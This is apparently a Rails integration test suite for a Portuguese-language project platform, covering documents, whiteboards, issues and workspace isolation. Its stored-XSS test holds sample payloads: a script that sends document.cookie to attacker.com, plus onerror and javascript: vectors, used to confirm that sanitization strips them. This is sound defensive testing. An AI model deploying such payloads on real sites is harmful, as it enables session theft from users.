require "test_helper"

class ExhaustivePlatformTest < ActionDispatch::IntegrationTest
  include Devise::Test::IntegrationHelpers

  setup do
    @user_a = users(:one)
    @user_b = users(:two)
    @workspace_a = workspaces(:one)
    @workspace_b = workspaces(:two)
    @project_a = projects(:one)
    @project_b = projects(:two)
  end

  # ============================================================================
  # 1. FEATURE 1: DOCUMENTOS, TIPTAP, EXPORTAÇÃO E SEGURANÇA XSS
  # ============================================================================
  test "feature 1: full document lifecycle with nested hierarchy and duplication" do
    sign_in @user_a

    # 1. Create root folder
    folder = @project_a.documents.create!(
      title: "Arquitetura e Requisitos",
      is_folder: true,
      icon: "folder",
      workspace: @workspace_a,
      author: @user_a
    )
    assert folder.is_folder?
    assert_equal "folder", folder.icon

    # 2. Create child specification document inside folder
    child_doc = @project_a.documents.create!(
      title: "PRD - Autenticação OAuth2",
      content: "<h1>Requisitos</h1><p>Fluxo de login seguro.</p><ul><li>Google OAuth</li><li>MFA</li></ul>",
      parent: folder,
      workspace: @workspace_a,
      author: @user_a
    )
    assert_equal folder.id, child_doc.parent_id
    assert_includes folder.children, child_doc
    assert_includes folder.descendant_ids, child_doc.id

    # 3. Test Markdown export
    md = child_doc.to_markdown
    assert_includes md, "# PRD - Autenticação OAuth2"
    assert_includes md, "# Requisitos"
    assert_includes md, "Fluxo de login seguro."
    assert_includes md, "- Google OAuth"

    # 4. Duplicate document
    copy = child_doc.duplicate!(author: @user_a)
    assert_equal "PRD - Autenticação OAuth2 (Cópia)", copy.title
    assert_equal child_doc.content, copy.content
    assert_equal @user_a.id, copy.author_id
  end

  test "feature 1: stored XSS sanitization protects against malicious payloads in rich text" do
    sign_in @user_a
    malicious_payload = <<~HTML
      <h1>Título Seguro</h1>
      <p>Texto normal</p>
      <script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
      <img src="valid.png" alt="valid" onerror="alert('XSS')">
      <iframe src="javascript:alert(1)"></iframe>
      <a href="javascript:alert('pwn')">Clique aqui</a>
    HTML

    doc = @project_a.documents.create!(
      title: "Payload Test",
      content: malicious_payload,
      workspace: @workspace_a,
      author: @user_a
    )

    # Asserts that harmful tags and event handlers are stripped
    assert_not_includes doc.content, "<script>"
    assert_not_includes doc.content, "onerror="
    assert_not_includes doc.content, "<iframe"
    assert_not_includes doc.content, "href=\"javascript:"
    assert_includes doc.content, "<h1>Título Seguro</h1>"
    assert_includes doc.content, "<p>Texto normal</p>"
  end

  # ============================================================================
  # 2. FEATURE 2: QUADROS DE ARQUITETURA, DIAGRAMAS E CANVAS
  # ============================================================================
  test "feature 2: whiteboard modes and canvas state persistence" do
    sign_in @user_a

    # 1. Whiteboard creation with different modes
    wb_canvas = @project_a.whiteboards.create!(
      title: "Diagrama C4 de Microsserviços",
      description: "Modelagem visual da arquitetura de backend",
      mode: "whiteboard",
      icon: "architecture",
      content: { nodes: [{ id: "n1", type: "system", label: "API Gateway" }], edges: [] }.to_json,
      workspace: @workspace_a,
      user: @user_a
    )
    assert_equal "whiteboard", wb_canvas.mode
    assert_equal "architecture", wb_canvas.icon
    assert_includes wb_canvas.content, "API Gateway"

    # 2. Mermaid diagram mode
    mermaid_chart = "graph TD\n  A[Client] --> B[API Gateway]\n  B --> C[Postgres DB]"
    wb_mermaid = @project_a.whiteboards.create!(
      title: "Fluxo de Dados Mermaid",
      mode: "mermaid",
      mermaid_code: mermaid_chart,
      workspace: @workspace_a,
      user: @user_a
    )
    assert_equal "mermaid", wb_mermaid.mode
    assert_equal mermaid_chart, wb_mermaid.mermaid_code
  end

  # ============================================================================
  # 3. FEATURE 3: BACKLOG, ISSUES, KANBAN E ROADMAP
  # ============================================================================
  test "feature 3: issue lifecycle, sub-tasks, milestones and progress calculation" do
    sign_in @user_a

    # Statuses
    backlog_status = @project_a.issue_statuses.find_by(category: "backlog") || @project_a.issue_statuses.create!(name: "Backlog", category: "backlog", position: 1)
    done_status = @project_a.issue_statuses.find_by(category: "done") || @project_a.issue_statuses.create!(name: "Concluído", category: "done", position: 3)

    # 1. Milestone
    milestone = @project_a.milestones.create!(
      title: "v1.0 Launch",
      description: "Primeira entrega estável da plataforma",
      status: "active",
      target_date: 2.weeks.from_now
    )

    # 2. Parent Issue
    parent_issue = @project_a.issues.create!(
      title: "Implementar Autenticação e Sessões",
      description: "<div>Configurar Devise e tokens JWT seguros.</div>",
      priority: :urgent,
      issue_status: backlog_status,
      milestone: milestone,
      creator: @user_a
    )

    prefix = @project_a.identifier_prefix.presence || "PRJ"
    assert_match(/^[A-Z0-9]+-\d+$/, parent_issue.identifier)
    assert_equal "urgent", parent_issue.priority
    assert_equal milestone.id, parent_issue.milestone_id

    # 3. Sub-tasks
    sub1 = @project_a.issues.create!(
      title: "Configurar Devise views",
      parent: parent_issue,
      issue_status: done_status,
      creator: @user_a
    )
    sub2 = @project_a.issues.create!(
      title: "Testar rate limiting no login",
      parent: parent_issue,
      issue_status: backlog_status,
      creator: @user_a
    )

    assert_equal 2, parent_issue.sub_issues.count
    assert_includes parent_issue.sub_issues, sub1
    assert_includes parent_issue.sub_issues, sub2

    # 4. Project Progress Calculation
    progress = @project_a.progress
    assert progress >= 0 && progress <= 100
  end

  # ============================================================================
  # 4. FEATURE 4 & SECURITY: MULTI-TENANT ISOLATION, IDOR & RATE LIMITING
  # ============================================================================
  test "security: strict multi-tenant isolation prevents cross-workspace data access (IDOR)" do
    # Direct model query scoping check
    assert_raises(ActiveRecord::RecordNotFound) do
      @user_a.workspaces.find(@workspace_b.id)
    end

    assert_raises(ActiveRecord::RecordNotFound) do
      @workspace_a.projects.find(@project_b.id)
    end

    # User A is signed in
    sign_in @user_a

    # User A tries to access User B's workspace via controller (should return 404 not found)
    get workspace_url(@workspace_b)
    assert_response :not_found

    get workspace_project_url(@workspace_b, @project_b)
    assert_response :not_found
  end

  test "security: overview 360 view renders consolidated project health correctly" do
    sign_in @user_a
    get workspace_project_url(@workspace_a, @project_a, view: "overview")
    assert_response :success
    assert_select "h1", text: /#{@project_a.name}/i
  end
end
